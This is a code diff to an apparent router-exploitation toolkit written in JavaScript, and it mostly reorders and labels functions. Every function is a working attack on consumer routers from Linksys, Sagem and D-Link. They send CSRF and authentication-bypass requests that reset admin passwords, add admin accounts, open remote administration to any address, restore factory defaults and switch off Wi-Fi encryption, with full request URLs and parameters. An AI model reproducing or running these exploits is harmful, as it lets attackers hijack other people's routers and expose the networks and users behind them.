@@ -1129,6 +1129,7 @@ function d615d3_commandexec(ip)
 	document.location="http://"+ip+url;
 }
 
+// Linksys WAG120N Change admin password
 function wag120pass() {
 	admin=prompt("Change administrator password:");
 	document.wag120pass.sysPasswd.value=admin;
@@ -1137,6 +1138,18 @@ function wag120pass() {
 		document.wag120pass.submit();
 	}
 }
+function wag120passr() {
+	ip=prompt("IP:");
+	document.wag120pass.action="http://"+ip+"/setup.cgi";
+	admin=prompt("Change administrator password:");
+	document.wag120pass.sysPasswd.value=admin;
+	document.wag120pass.sysConfirmPasswd.value=admin;
+	if (ip==null || ip==""){}else{
+		document.wag120pass.submit();
+	}
+}
+
+// Sagem F@ST 2604 CSRF Change Admin Password
 function sagem2604() {
 	admin=prompt("Change administrator password:");
 	document.sagem2604.sysPasswd.value=admin;
@@ -1153,6 +1166,8 @@ function sagem2604r() {
 		document.sagem2604.submit();
 	}
 }
+
+// Linksys WAG120N Add admin user
 function wag120add() {
 	user=prompt("Add administrator username:");
 	document.wag120add.sysname.value=user;
@@ -1161,16 +1176,6 @@ function wag120add() {
 	document.wag120add.sysConfirmPasswd.value=admin;
 	if (user==null || user==""){}else{
 		document.wag120add.submit();
-	}
-}
-function wag120passr() {
-	ip=prompt("IP:");
-	document.wag120pass.action="http://"+ip+"/setup.cgi";
-	admin=prompt("Change administrator password:");
-	document.wag120pass.sysPasswd.value=admin;
-	document.wag120pass.sysConfirmPasswd.value=admin;
-	if (ip==null || ip==""){}else{
-		document.wag120pass.submit();
 	}
 }
 function wag120addr() {
@@ -1185,6 +1190,8 @@ function wag120addr() {
 		document.wag120add.submit();
 	}
 }
+
+// Linksys WRT54G enable remote interface
 function wrtradmin() { //fixed. thnx lightos
 	admin=prompt("Set administrator password:");
 	document.wrtadmin.http_passwd.value=admin;
@@ -1207,6 +1214,8 @@ function wrtradminr() {
 		document.wrtadmin.submit();
 	}
 }
+
+// Linksys WRT54G restore factory defaults
 function wrtdefault() {
 	ip=prompt("IP:");
 	document.wrtdefault.action="http://"+ip+"/factdefa.tri";
@@ -1214,6 +1223,8 @@ function wrtdefault() {
 		document.wrtdefault.submit();
 	}
 }
+
+// Linksys WRT54G disable wifi encription
 function wrtwifi() {
 	ip=prompt("IP:");
 	document.wrtwifi.action="http://"+ip+"/Security.tri";
@@ -1222,20 +1233,28 @@ function wrtwifi() {
 	}
 }
 
+// D-Link WBR-1310 Authentication Bypass set new password
 function wbrpass() {
 	admin=prompt("New password:");
 	if (admin==null || admin==""){}else{
 		document.location="http://192.168.0.1/tools_admin.cgi?admname=admin&admPass1="+admin+"&admPass2="+admin+"&username=user&userPass1=WDB8WvbXdHtZyM8&userPass2=WDB8WvbXdHtZyM8&hip1=*&hport=8080&hEnable=1";
 	}
 }
+function wbrpassr() {
+	ip=prompt("IP:");
+	admin=prompt("New password:");
+	if (ip==null || ip==""){}else{
+		document.location="http://"+ip+"/tools_admin.cgi?admname=admin&admPass1="+admin+"&admPass2="+admin+"&username=user&userPass1=WDB8WvbXdHtZyM8&userPass2=WDB8WvbXdHtZyM8&hip1=*&hport=8080&hEnable=1";
+	}
+}
 
+// D-Link DIR-615 change password &amp; enable remote admin
 function dirpass() {
 	admin=prompt("New password:");
 	if (admin==null || admin==""){}else{
 		document.location="http://192.168.0.1/apply.cgi?admin_password="+admin+"&admin_password1="+admin+"&admPass2="+admin+"&remote_enable=1&remote_http_management_enable=1&remote_http_management_port=8080&remote_inbound_filter=Allow_All&remote_http_management_inbound_filter=Allow_All";
 	}
 }
-
 function dirpassr() {
 	ip=prompt("IP:");
 	admin=prompt("New password:");
@@ -1244,11 +1263,11 @@ function dirpassr() {
 	}
 }
 
+// D-Link DSL-500T reset password CSRF
 function dsltpass() {
 	alert("Reseting password admin:password");
 	document.dsltpass.submit();
 }
-
 function dsltpassr() {
 	ip=prompt("IP:");
 	alert("Reseting password admin:password");
@@ -1300,13 +1319,6 @@ function singwiredosr() {
 	}
 }
 
-function wbrpassr() {
-	ip=prompt("IP:");
-	admin=prompt("New password:");
-	if (ip==null || ip==""){}else{
-		document.location="http://"+ip+"/tools_admin.cgi?admname=admin&admPass1="+admin+"&admPass2="+admin+"&username=user&userPass1=WDB8WvbXdHtZyM8&userPass2=WDB8WvbXdHtZyM8&hip1=*&hport=8080&hEnable=1";
-	}
-}
 function setipadminadmin() {
 	ip=prompt("IP:");
 	if (ip==null || ip==""){}else{
